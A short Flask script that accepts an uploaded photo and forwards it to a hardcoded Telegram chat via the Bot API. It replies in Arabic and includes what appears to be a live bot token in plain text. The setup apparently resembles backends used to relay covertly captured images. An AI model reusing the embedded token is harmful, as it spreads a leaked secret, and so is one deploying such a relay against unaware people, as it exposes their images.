from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = '7710320553:AAEwANx6RCJcuthKl041-H4KZ0zezIJr0io'
CHAT_ID = '6325478675'

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['photo']
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': file.stream}
    data = {'chat_id': CHAT_ID}
    requests.post(url, files=files, data=data)
    return 'تم الاستلام'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)